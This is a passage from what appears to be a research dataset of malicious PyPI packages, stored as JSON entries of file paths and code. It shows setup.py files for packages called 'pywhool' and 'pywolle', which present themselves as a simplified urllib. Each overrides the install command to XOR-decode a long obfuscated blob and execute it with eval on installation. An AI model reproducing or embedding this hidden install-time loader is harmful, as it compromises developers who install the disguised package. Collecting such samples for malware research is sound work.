JlSa\\rYZ\\x05]BhrJbPrp@]tqxja\\x00\\x05aq@fRZ\\rYV^pCZ\\x08NWg\\n_CT\\x7fcAyXcQmw]}a_qO{\\\\o^TOz@zwsPq_[DV\\x07sEUwe_bYW`jkfUc\\x0bz]f\\x05ZXPqOUhe{|SYd^Pr`i`ZCZi\\x05d[p[\\\\ch\\x04~GV{gBl\\x0b^XP~DP{kwVU^UHTwwXob@E{^\\x7f\\x06U_qYR|pWuLaA{w`Rx[}\\x06`vKbS\\x01aKV\\tLQV\\x05JBh\\x04TG^`A[alpAfrp\\t`aKUe[\\x0c\\\\[`TBk\\x06LTadZ]ZT\\x0fNP\\x0bi\\th~MmVe\\x04YW\\x02]Mms@bSusNSuq}ic\\x0c\\t`pH`QY\\x00[R]vD[\\x01KWe\\x00[HQ\\x7fbF}]`Wjp\\\\xl\\\\pA|Yx^Pv\\x7f^s^qrQ~|[tMiG}tu@mt\\x03ccagSd\\n}Ve\\n]YUuFUeb{xW\\x06jYVe\\x00Y}OXxzwx_quqV{w{CRwfEswj]aIGQm~bHioxNjp@\\x05Zq\\x00VQc\\x07\\x0flsN{Z\\x7fqsing\\\\aq@dS\\x05rCTd\\x03Ya\\x7fNzSn}@R\\x0b{Cm\\\\cQmw]GWXj@S\\x01{Top}\\x03jls\\x08qs\\x01]PZoVivrIZ\\x02WMid\\x06Hm~LfWptMV~nE`pA`Qc\\x07]V\\x06RCa\\x06}\\x06in\\x7f\\x04coqBUZ~M|ZAPpTs]yj\\x06\\nSUY\\x05maY_\\x7f\\x00w[QvznT\\x00]cVqe@Qwx\\x01qs~Hhc\\x7f\\x05ke\\tYY]e^TpP[c\\tzXPZ^CVu\\rfYqoKRw{F}sNLo\\x04}Ye\\x04]X[pOBdYbB|txXZPQN|zX^zQt\\\\fHAQmwoMomrLotM\\x00Uq\\n]Rc\\x0c\\x01`pHsQ|{phhbX`vKgR\\x01qFTo\\x01\\\\kqJzSavKZ\\x05wNjZ`UlsRI[Za@T\\x05{Waqv\\x07ho~\\x07|v\\x07[[W`Wj\\x7fq@R\\nQLne\\x00HmwAcPmv\\x06me\\x05\\x05ypKPe\\x06UMbq\\t\\x02QM{|kgHCZI\\x06XUtb[|{mUb\\x05ZMyru\\x02seN_}rJCa\\x07`\\tpqWLQp{[c`@Dxs\\x04Pa^\\x0f\\x07X~ZAh@PIsQtR~qpU|rxPW\\x06zZU[]Z~]~\\x05krAn[\\x04fHQ\\x05AVT\\x02HFb\\x02_AVeOQd`vEapt\\x04k`@Qm[\\x00PRc^Cn\\x04NZm`_\\\\S[\\x0cN[\\x05b\\x07iqLoTd\\x03\\\\[\\nRNj\\x7fKmT\\x7fsLSqs|of\\x0c\\x06ms@gT_\\x0cYT[uGP\\x05A[m\\x05\\\\KVsoA\\x7fZbS`vW~dY~KyU~ZWt{G{urZq_RMT\\x07xFPrcVc^W_QngN``jCP`\\x00Py\\x00dN`n\\x03NhTe@y\\x7f\\x04\\x00mu\\x08\\x01W\\\\AAlbjGU\\x00|P{\\x04aEW\\x06\\x0cKZ\\x04vZ{w\\x00BR]\\\\F[]_\\x04U`uua\\t~ta\\x06xddc\\rwqusWT|`AWOYOu\\x05uAQe\\x04[]N\\r]S\\x05\\x04AotAA]\\nU]{zy}\\x7fTMVaj\\x7f^V_wTm}LEU\\x00QGUX\\x02Pkq\\x7fO[sbYVs\\x7fVivzFag\\x02DR^SQm}\\x05Bj\\x04xBQ\\x04\\x01_\\\\pA[f\\x06^Cnr\\x0f\\nZ\\x06KUe\\x05g\\\\ZYiPe`bBQeNTlq|Bh\\nyQR`{Vot\\x7f\\x07V\\x02k[Waa\\x06otMoVa\\x06XQ\\x07]BqsX]PsAC}]f\\x04bcyWR]y\\x02l`~\\x02zt{]{urvwZA[fl|ZW[xZa\\x7fGER\\x04QD[Y\\tTirr@Vvd_]~pWj\\x7fyOio\\x04EU_UQmt\\x08Gl\\x06r@T\\x00\\x0cZSpKPe\\x06UMbq\\t\\x02Q\\x05AVd\\x03bX[^bSddaGQnLQf\\x7fxBh\\x05rZZnw[hr|\\x06mm|\\t]oqUhpQD[ZjAU\\x04zQ`\\x00d_ZWdXQP\\x06\\x0biVx\\\\}KZy|rxP|vyQ~qwATqeFxs`QiL@RjroOkhzJ`vK\\x03Rt\\x0e\\\\To\\x01\\x0bkqJvQ~zwankPhrJeV\\x07pMX`\\x06XhpMzX`vNS\\x04zAo]dTa\\x7fRDPTaOT\\x0b{Vot\\x7f\\x02lis\\x07|p\\tZU\\\\cTopqJQ\\x06]Aaa\\x01KjrAaTh~\\x00bg\\x03\\x06~uOQc\\x08X}~M{AV[rHq_N_yYw_\\x7ff\\x03\\nZZ_\\x06je]Ys\\x06v[UtvoV\\x01^cX~`GPzr\\x00y}{Lmew\\x02od\\x00^TXn\\\\SqR^a\\x07}YPYUO\\\\u\\x05eSsoFSsy@qvKAf\\x00y]`\\n\\\\^QpEAgXnGqqwWS]ULzv]^s^r_aLEWaqnMko~MmuN\\x00[~\\x0fZSn\\x06\\x00h~MwTzswlik_ms@eU\\x00sCVa\\x06]krAvYa~HP\\x07wCk^bS`vWDR^eDQ\\x0bzQkq|\\x04knr\\x02qs\\x08TRZdUlst@[\\x05WOia\\x04Naq@cToz\\x07od\\x06\\x05w\\x7fNWd\\t_v}B|@n_w\\x02|XxZ|pvYT[RMyuX@zp{[ZZ~]Vw{mR\\x02XdYweGRpv\\x0b|}\\x01DWpZDP[[\\\\sgV_ywsQ}vw^pp\\nAja\\x01[c^rs~[LTckx[ZWxWjqGJR\\nQEU\\\\\\x00Qmt\\x7f@Vpj^SusTopyEjc\\x08HZ[TRjq\\x08Eh\\x03zF[\\x02\\nYTuOQc\\nXGip\\x0b\\x07Q\\x07@Qm\\x05kPSZcQ`b`L]aKUe~\\x7fBc\\x04r_SozTmux\\x07`a|\\x04VaqZh~Q\\x7fcXh\\x02y_c^VLqE~q\\x7f_~_XFW\\x07sH\\\\qe^h]]akhaWn\\x03}[e\\x01_^W\\x7fCUcdppQ[nZ\\\\qohiYBZm\\x06gVp[Wbi\\x05\\x7fDZ\\x7fiBd\\x05\\\\[WtA^rjtWPUWCQ~{ZmeIAy]s\\x06W\\\\z\\\\Vz|XzLbCzw`_q]}\\x07jrAcR\\x02fI[\\x01KWU\\x01ODo\\nXGUaJWcnzEjq\\x7f\\x08ibJUaX\\x0fQ[`_Cj\\x07MWm`T]RZ\\rMW\\x01l\\x07a\\x7fNlSn\\x06RR\\x0bQOotIfQv\\x7fNQvzxme\\x00\\x06opKbPY\\x00V[[vEQ\\x05AVd\\x03\\\\J\\\\we@~YeQm~PBQZ`BV\\x05uUkqoKSsdOxX`\\rcdzQz_wpX\\x7fqX|MeGypw@a~\\x03`hab^f\\x0b{Zb\\x00Y^WvNPefzyU\\x01gXVa\\x06]yMRsquqV{wxRxsrF[weA{tn[dBDQkqdNhnrH`pA\\x0fRs\\x0bXUb\\x03\\x00aqKtS~wq`oj_iqLdW\\x01pCXn\\x03Zj\\x7fKwQo{LU\\x01\\x7fDo_kTms\\\\FU_gAS\\x05}Pkrw\\x08anz\\x01{q\\x08YS^fS`vqMR\\x01SKlo\\x05HkqJ`Wnv\\x02ba\\t\\n~rJUW\\x07QLZ\\x7f_\\x05y_BSpZ}^zd\\x01\\x04V^Z\\x07cj^Yx\\x0bi@R\\n\\x05RT\\x00Y\\x03QvUD|rTBTu\\x0cNSuq\\x02QZ{Pa\\x04DWkls_Pw\\\\\\x02bfKAQd\\x06EW\\x0b~\\x02z\\x7f|\\x05kXzKZ\\x04wTS\\x07\\x7fE}r\\x0fCap\\x06\\x07RXw\\\\`\\x05LQho~]TtZ\\x05cjQ]cCCZh~MVaj\\x7f^V_wTms@UR\\x00MAm\\x04_FUbA[`pHsQ|{phhbX`vKWhu}Dlo\\x05BQZVWjp@QlaURSY\\x0bLV\\x07l\\taqKUhpQD[ZjAU\\x04zTmuNTl\\nd\\\\QWb^doc@SdIQmwAfVX\\x01XT_sCT\\x07KPkrAl]n~\\x01hc\\t\\x07\\x7fvHS`vKMTd\\x02\\x02To\\x05^\\x7fYBDQuqAqus|\\x7fXJUlsNoZ\\x05eOS\\x07MWaq@\\x00Sp\\rYTd\\x03\\x0ea\\x7fNWj|uNS}g]SuwQmwAT`X\\x01^UeYBm\\x07KPkrAvYa~HP\\x07wCk^bS`vKWf\\x01[Go\\x7f\\r\\x01P\\x06JWjp@f\\\\q\\x7fATwpxnb\\x03\\x08aqKUhpwM[\\x05\\\\Nh`\\x05MmuNTa\\x7fx\\x01Q\\naURll\\x05~[]QW_w\\x06l[zOU\\x00{[T\\x05~FPZoMspD\\\\{_t\\x03ivHS`veNjk}Hm~LQk\\x7fFGP\\x04\\\\BZX\\x08[hrJUemtNkpu\\x06i`MWaq@dS\\x05rCTd\\x03Ya\\x7fNWj|\\x02Ii\\x0b\\x7fCT\\x00\\x08_QwATms@nVe\\x00\\\\U\\x05WIkrA[`p~\\x01kls\\x05xu\\x01\\\\Z^eWhuOQ`p~Di\\x04x\\\\PnvQ`pA[e\\x07^LPr`Mw]aUhpMWZ\\x7fT\\x07Pp\\rBQJ\\x03[\\\\~c]~zqTySx\\x03otIQmwoMomrLotMTo~G@Q\\x06]HZX\\x01RjrAV`hrGjwu\\x04ieOQ`U\\rZQ`^Ah\\x07@Q`pAvQc|OV\\x06xOcYaUhpMWo\\x05TBkp\\r\\x04V\\x02NTa\\x7fN`V~u@T{w{me\\x04\\x03mwATmszOU\\x00QNna\\x02IkrA[`p~\\x04Q\\x07kYSdi\\x00`vKWh{y\\x02Qo}GP\\x7f^\\x07{Z\\x08Aq~wWjcJEdcd@]`fEyq{[c`vEaafNQdcGa~\\x03BQ@\\x06@jo\\x04CS_d]oXsszY@UotMaT\\x04eJP\\x05A[`pH\\x06Ps\\x00[Pg\\x05\\t`vKWhvqEV}fZWptWjp@Qm[\\x00PRc^Cn\\x04NZaqKxQa{M[\\x04vAkYfTmuNTo\\x0bZAh~\\n\\nS\\tMVotIfQv\\x7fNQvzxme\\x00\\x06opKPkr{AZ\\x04THkc\\x08OivHS`v}\\x01S\\x00e^Wlm\\x02kqJWj~v\\x02\\\\apMS|^\\x05}\\\\]Wrf\\\\QyutSptyPxp\\r@od\\x02XcP|p}UKZf`{YT\\\\\\x7fQmyMDW\\x07\\\\FU\\\\\\x04TosuDPqkP\\\\qvRjrsChg\\x01@Z]WWhv\\x06Bl\\x0b~DP\\x05\\x0bYVp@Qn\\x04UMjs\\x0b\\x05W\\x04NZl\\x04a^SXdSm`nBUaLT`{|Ac\\n|\\\\Pa}Zh~{\\x00T\\x01c^We`\\x07ms@ndg\\x01Mz_\\x06ZjlhQtuqXkgpE}^TIYhaX{tn\\\\lUX\\x02P\\x05t_PaTGqu\\x00\\x08SYtCW\\x07lUZ^qBUagB]\\x05\\rDS\\x05r\\\\T^\\x0f^pz\\x0f_P\\nWLR\\x7f\\x0c]mqpDVysGW\\x06rFSz^Pe]\\n`aa]kl\\x07f~`wx\\\\Pxb\\x00[x~\\x02|J\\x0eZV\\x7f_FR\\x7fQAk\\x04\\x01Ft\\x04kK|\\x07x\\x07V[dI[`f_yu\\x7fpv[@Tgoz[V]xTaqBGP\\x0bWIRV\\x04VowwEVtk_Qr~Uot\\x7fAna\\x02CQY][`s\\x01Ak\\x07sCR\\x02\\t]\\\\vKWf\\x01[Go\\x7f\\r\\x01P\\x06JWg\\x05jZ[Xh_dcdCPcNZl\\x7fy@j\\x05\\x7f\\\\[ovTiqz\\x02V\\x00d[[mo\\x04j\\x7fK@To\\x00\\x05Ve\\x00^y_IGVvrUU\\\\{\\x07nny\\x03zwpQquzu}XAVgh~\\\\[^}Wh{CAW\\nPBQY\\x03Wjs~E[skPTstUls|O``\\x02FR[QWar\\tGh\\x04~AV\\x01\\x0fZ]\\x7fNWd\\x0b_Lj\\x7f\\x0c\\x06T\\x03IQ`\\x02k_V[iQcecBS`KPf|sNb\\x05zYPlwViv~\\x05[\\x03aXRgn\\x02m~LHRt\\x07CWn[[`q\\x0cQQl`LmbdMX`\\x07Q|\\x05gM``\\rMkZbN|t\\x07\\x02c~\\x0f\\x07PTKOiogDU\\x00xUy\\x03kAQ\\x07\\rEU\\x00s\\\\~u\\nDPYUN[[\\\\\\x01Wg{re\\x01zvj\\x01ydff\\x02w|{~]W\\x7f`CQLWDt\\x04\\x7fOQg\\x03YPL\\x03S[\\x05\\x03@jqBB]NqPx\\\\y\\x01muNaZ\\x0b`MQ\\x08KZU\\nMCm\\x00]GSgATdmzAeus\\x07n`KPfY\\x00PZa\\\\Dh\\x05AVeg\\\\Z[]\\nNR\\x01m\\x02m~LjR`\\x07_P\\x05\\\\H`pAlTstOPvtwc`\\x06\\x07hpMeZZ\\x01YRZrCV\\x02NTl\\nZNV~eM~RgVotUBW\\\\kAQ\\x06uQducDTqeJ\\x7fYo\\x0cbezRPZw\\x05hhz\\x00qsz]yp}vzTLQeo|XQXvQ`~MKR\\x06VFV[\\x07ZaruASsg\\\\]p~Tiq~Ald\\x07G[TRWj|\\x02Ii\\x0b\\x7fCT\\x00\\x08_QwATc\\x07TCmu\\x0c\\x04T\\x07KPf\\x07kP[XaVfco@UfHSmxyBj\\x00}ZW`zQkq|\\x04knr\\x02\\\\n{[hrV|`_o\\tuYi_SO|ZrfWPxtuP|pwPpqx\\x05kWq@R\\n{YT\\x01|GV_oB~ra_fHETopeIilsB`pH\\x06Ps\\x00[Pg\\x05\\t`vKvS{uwl`fZkqJgP\\x04~FYa\\x0cVhrJxUbx@[\\x04}@jXgWaq\\\\GSZfAQ\\x00xTa\\x7fx\\x04kay\\ty}\\x04YU\\\\gQmw{NW\\x07\\\\One\\x04MopKgVlw\\x08ba\\x00\\x03|rAVg\\x00\\\\\\x7fuJzAT^}H|QCUP\\x05ZXPqO\\x0bn~s\\tjgEQm\\x07^U`\\x05@\\x0ff~\\x7f\\x05cdS|xtuP|pwPpztNVnyNSU\\x0c_mj\\x7fHy_s\\x06W\\\\P[~Yx\\x01opKeP\\x06oA[\\x07HRW\\x06ACk\\x02\\\\E^fKWakuEg\\x7fr\\x02jaJWg[\\x01ZZaUMj\\x05JU`bZSZZ\\nLR\\x04o\\x04aq@oP`\\x01\\\\W\\x00RMa\\x7fN`V~u@T{w{me\\x04\\x03mwAfVX\\x01XT_sCT\\x07KPf\\x07UB\\\\qfE|^kVivTzlZzM|]m[VA}Az\\x7f|[ha@Ah`kATcgE}rxVc`}D``gM]`mGr^uP|pt[\\\\~xXQqb\\x0fsQtR~qpU|rxPVr~LTEE[U~}_|]x_qw_V{wxRRwvJ[G\\x0e\\t\\x12\\x1a\\x1e8P@WWCC\\x08>\\x12\\x16\\x18\\x12HWJK\" \n        iOpvEoeaaeavocp = \"0426456997360654978717475367996429390855721251975586725776333498860124951000803403725842372426828698\"\n        uocpEAtacovpe = len(wopvEaTEcopFEavc)\n        oIoeaTEAcvpae = \"\"\n        for fapcEaocva in range(uocpEAtacovpe):\n            nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]\n            qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]\n            oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\n        eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\n        install.run(self)\n\n# Setting up\nsetup(\n    name=\"pywhool\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=['python', 'http', 'https', 'requests', 'urllib', 'sockets', 'tcp'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    cmdclass={'install': CustomInstallCommand}\n)\n\nclass send():\n    pass\n\ndef __init__():\n    pass"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-19-pywolle-v1.0.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom pathlib import Path\n\n\n\nVERSION = '1.0.0'\nDESCRIPTION = 'A simplified version of urllib.'\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / \"README.md\").read_text()\n\nclass CustomInstallCommand(install):\n    def run(self):\n        wopvEaTEcopFEavc =\"DFK\\x0c>\\x15\\x16\\x19\\x19^^F_DA\\x14[VKR\\x07\\x03>\\x17\\x15\\x13\\x16C@IS\\x1c\\x10{J\\x19xo\\x17\\x1c\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x1eS@W[\\x1e[YCQ\\x04\\x02\\x1aW\\x00\\r]RPYTS\\x1d\\x16X`\\t@S\\x04~\\x07|t\\x0fMzTZ@Q~\\n@T{wOSe{EV\\\\\\x00]omvLt_MAm\\x04_Fzp\\t_Z\\x05}Dh\\x06o\\x05Sw\\t^Yg\\x07[{bGBoQvDPN\\x07Cknj]t[o\\x0cQl|\\x06WL^Ts\\x07~\\x00hpMbZ\\x05nNR\\x06LTP\\x01NAc\\x0bZAToKZa`wBeuw\\x02lgAT`X\\x01^UeYBm\\x07KPgcUR[[\\tKP\\x06c\\x05ivHhYg\\x06_R\\x00SHm~LfWptMVuz|ba\\x0c\\thrJgWX\\x0fWZZuBS\\x07MWl\\x04TMUpbC{YdTazUD{}\\x03\\x00y}o]Uz\\x7f^zVVP|vyQSz\\x7f\\x02xQ\\\\Tzwx_quqV{s\\x00O}]\\x01Bbw_M{tn[dBDQkqdNhnrH`pA\\x0fRs\\x0bXUb\\x03\\x00aqKtS~wq`oj_iqLdW\\x01pCXn\\x03Zj\\x7fKwQo{LU\\x01\\x7fDo_kTms\\\\FU_gAS\\x05}Pkrw\\x08anz\\x01{q\\x08YS^fS`vqMR\\x01SKlo\\x05HkqJ`Wnv\\x02ba\\t\\n~w{Fw\\\\w^ptrQyutS[\\x04z[S^\\\\Z|X{\\x01a\\x7fNbQ\\x0be@S\\tMVR\\x00IDo\\x03UBSc@Ufjw@equ\\x03jbA[m[\\tYPcU@k\\x01HSlg_^S^\\x0eHW\\nn\\x02kqJlSa\\rYZ\\x05]BhrJbPrp@]tqxja\\x00\\x05aq@fRZ\\rYV^pCZ\\x08NWg\\n_CT\\x7fcAyXcQmw]}a_qO{\\\\o^TOz@zwsPq_[DV\\x07sEUwe_bYW`jkfUc\\x0bz]f\\x05ZXPqOUhe{|SYd^Pr`i`ZCZi\\x05d[p[\\\\ch\\x04~GV{gBl\\x0b^XP~DP{kwVU^UHTwwXob@E{^\\x7f\\x06U_qYR|pWuLaA{w`Rx[}\\x06`vKbS\\x01aKV\\tLQV\\x05JBh\\x04TG^`A[alpAfrp\\t`aKUe[\\x0c\\\\[`TBk\\x06LTadZ]ZT\\x0fNP\\x0bi\\th~MmVe\\x04YW\\x02]Mms@bSusNSuq}ic\\x0c\\t`pH`QY\\x00[R]vD[\\x01KWe\\x00[HQ\\x7fbF}]`Wjp\\\\xl\\\\pA|Yx^Pv\\x7f^s^qrQ~|[tMiG}tu@mt\\x03ccagSd\\n}Ve\\n]YUuFUeb{xW\\x06jYVe\\x00Y}OXxzwx_quqV{w{CRwfEswj]aIGQm~bHioxNjp@\\x05Zq\\x00VQc\\x07\\x0flsN{Z\\x7fqsing\\\\aq@dS\\x05rCTd\\x03Ya\\x7fNzSn}@R\\x0b{Cm\\\\cQmw]GWXj@S\\x01{Top}\\x03jls\\x08qs\\x01]PZoVivrIZ\\x02WMid\\x06Hm~LfWptMV~nE`pA`Qc\\x07]V\\x06RCa\\x06}\\x06in\\x7f\\x04coqBUZ~M|ZAPpTs]yj\\x06\\nSUY\\x05maY_\\x7f\\x00w[QvznT\\x00]cVqe@Qwx\\x01qs~Hhc\\x7f\\x05ke\\tYY]e^TpP[c\\tzXPZ^CVu\\rfYqoKRw{F}sNLo\\x04}Ye\\x04]X[pOBdYbB|txXZPQN|zX^zQt\\\\fHAQmwoMomrLotM\\x00Uq\\n]Rc\\x0c\\x01`pHsQ|{phhbX`vKgR\\x01qFTo\\x01\\\\kqJzSavKZ\\x05wNjZ`UlsRI[Za@T\\x05{Waqv\\x07ho~\\x07|v\\x07[[W`Wj\\x7fq@R\\nQLne\\x00HmwAcPmv\\x06me\\x05\\x05ypKPe\\x06UMbq\\t\\x02QM{|kgHCZI\\x06XUtb[|{mUb\\x05ZMyru\\x02seN_}rJCa\\x07`\\tpqWLQp{[c`@Dxs\\x04Pa^\\x0f\\x07X~ZAh@PIsQtR~qpU|rxPW\\x06zZU[]Z~]~\\x05krAn[\\x04fHQ\\x05AVT\\x02HFb\\x02_AVeOQd`vEapt\\x04k`@Qm[\\x00PRc^Cn\\x04NZm`_\\\\S[\\x0cN[\\x05b\\x07iqLoTd\\x03\\\\[\\nRNj\\x7fKmT\\x7fsLSqs|of\\x0c\\x06ms@gT_\\x0cYT[uGP\\x05A[m\\x05\\\\KVsoA\\x7fZbS`vW~dY~KyU~ZWt{G{urZq_RMT\\x07xFPrcVc^W_QngN``jCP`\\x00Py\\x00dN`n\\x03NhTe@y\\x7f\\x04\\x00mu\\x08\\x01W\\\\AAlbjGU\\x00|P{\\x04aEW\\x06\\x0cKZ\\x04vZ{w\\x00BR]\\\\F[]_\\x04U`uua\\t~ta\\x06xddc\\rwqusWT|`AWOYOu\\x05uAQe\\x04[]N\\r]S\\x05\\x04AotAA]\\nU]{zy}\\x7fTMVaj\\x7f^V_wTm}LEU\\x00QGUX\\x02Pkq\\x7fO[sbYVs\\x7fVivzFag\\x02DR^SQm}\\x05Bj\\x04xBQ\\x04\\x01_\\\\pA[f\\x06^Cnr\\x0f\\nZ\\x06KUe\\x05g\\\\ZYiPe`bBQeNTlq|Bh\\nyQR`{Vot\\x7f\\x07V\\x02k[Waa\\x06otMoVa\\x06XQ\\x07]BqsX]PsAC}]f\\x04bcyWR]y\\x02l`~\\x02zt{]{urvwZA[fl|ZW[xZa\\x7fGER\\x04QD[Y\\tTirr@Vvd_]~pWj\\x7fyOio\\x04EU_UQmt\\x08Gl\\x06r@T\\x00\\x0cZSpKPe\\x06UMbq\\t\\x02Q\\x05AVd\\x03bX[^bSddaGQnLQf\\x7fxBh\\x05rZZnw[hr|\\x06mm|\\t]oqUhpQD[ZjAU\\x04zQ`\\x00d_ZWdXQP\\x06\\x0biVx\\\\}KZy|rxP|vyQ~qwATqeFxs`QiL@RjroOkhzJ`vK\\x03Rt\\x0e\\\\To\\x01\\x0bkqJvQ~zwankPhrJeV\\x07pMX`\\x06XhpMzX`vNS\\x04zAo]dTa\\x7fRDPTaOT\\x0b{Vot\\x7f\\x02lis\\x07|p\\tZU\\\\cTopqJQ\\x06]Aaa\\x01KjrAaTh~\\x00bg\\x03\\x06~uOQc\\x08X}~M{AV[rHq_N_yYw_\\x7ff\\x03\\nZZ_\\x06je]Ys\\x06v[UtvoV\\x01^cX~`GPzr\\x00y}{Lmew\\x02od\\x00^TXn\\\\SqR^a\\x07}YPYUO\\\\u\\x05eSsoFSsy@qvKAf\\x00y]`\\n\\\\^QpEAgXnGqqwWS]ULzv]^s^r_aLEWaqnMko~MmuN\\x00[~\\x0fZSn\\x06\\x00h~MwTzswlik_ms@eU\\x00sCVa\\x06]krAvYa~HP\\x07wCk^bS`vWDR^eDQ\\x0bzQkq|\\x04knr\\x02qs\\x08TRZdUlst@[\\x05WOia\\x04Naq@cToz\\x07od\\x06\\x05w\\x7fNWd\\t_v}B|@n_w\\x02|XxZ|pvYT[RMyuX@zp{[ZZ~]Vw{mR\\x02XdYweGRpv\\x0b|}\\x01DWpZDP[[\\\\sgV_ywsQ}vw^pp\\nAja\\x01[c^rs~[LTckx[ZWxWjqGJR\\nQEU\\\\\\x00Qmt\\x7f@Vpj^SusTopyEjc\\x08HZ[TRjq\\x08Eh\\x03zF[\\x02\\nYTuOQc\\nXGip\\x0b\\x07Q\\x07@Qm\\x05kPSZcQ`b`L]aKUe~\\x7fBc\\x04r_SozTmux\\x07`a|\\x04VaqZh~Q\\x7fcXh\\x02y_c^VLqE~q\\x7f_~_XFW\\x07sH\\\\qe^h]]akhaWn\\x03}[e\\x01_^W\\x7fCUcdppQ[nZ\\\\qohiYBZm\\x06gVp[Wbi\\x05\\x7fDZ\\x7fiBd\\x05\\\\[WtA^rjtWPUWCQ~{ZmeIAy]s\\x06W\\\\z\\\\Vz|XzLbCzw`_q]}\\x07jrAcR\\x02fI[\\x01KWU\\x01ODo\\nXGUaJWcnzEjq\\x7f\\x08ibJUaX\\x0fQ[`_Cj\\x07MWm`T]RZ\\rMW\\x01l\\x07a\\x7fNlSn\\x06RR\\x0bQOotIfQv\\x7fNQvzxme\\x00\\x06opKbPY\\x00V[[vEQ\\x05AVd\\x03\\\\J\\\\we@~YeQm~PBQZ`BV\\x05uUkqoKSsdOxX`\\rcdzQz_wpX\\x7fqX|MeGypw@a~\\x03`hab^f\\x0b{Zb\\x00Y^WvNPefzyU\\x01gXVa\\x06]yMRsquqV{wxRxsrF[weA{tn[dBDQkqdNhnrH`pA\\x0fRs\\x0bXUb\\x03\\x00aqKtS~wq`oj_iqLdW\\x01pCXn\\x03Zj\\x7fKwQo{LU\\x01\\x7fDo_kTms\\\\FU_gAS\\x05}Pkrw\\x08anz\\x01{q\\x08YS^fS`vqMR\\x01SKlo\\x05HkqJ`Wnv\\x02ba\\t\\n~rJUW\\x07QLZ\\x7f_\\x05y_BSpZ}^zd\\x01\\x04V^Z\\x07cj^Yx\\x0bi@R\\n\\x05RT\\x00Y\\x03QvUD|rTBTu\\x0cNSuq\\x02QZ{Pa\\x04DWkls_Pw\\\\\\x02bfKAQd\\x06EW\\x0b~\\x02z\\x7f|\\x05kXzKZ\\x04wTS\\x07\\x7fE}r\\x0fCap\\x06\\x07RXw\\\\`\\x05LQho~]TtZ\\x05cjQ]cCCZh~MVaj\\x7f^V_wTms@UR\\x00MAm\\x04_FUbA[`pHsQ|{phhbX`vKWhu}Dlo\\x05BQZVWjp@QlaURSY\\x0bLV\\x07l\\taqKUhpQD[ZjAU\\x04zTmuNTl\\nd\\\\QWb^doc@SdIQmwAfVX\\x01XT_sCT\\x07KPkrAl]n~\\x01hc\\t\\x07\\x7fvHS`vKMTd\\x02\\x02To\\x05^\\x7fYBDQuqAqus|\\x7fXJUlsNoZ\\x05eOS\\x07MWaq@\\x00Sp\\rYTd\\x03\\x0ea\\x7fNWj|uNS}g]SuwQmwAT`X\\x01^UeYBm\\x07KPkrAvYa~HP\\x07wCk^bS`vKWf\\x01[Go\\x7f\\r\\x01P\\x06JWjp@f\\\\q\\x7fATwpxnb\\x03\\x08aqKUhpwM[\\x05\\\\Nh`\\x05MmuNTa\\x7fx\\x01Q\\naURll\\x05~[]QW_w\\x06l[zOU\\x00{[T\\x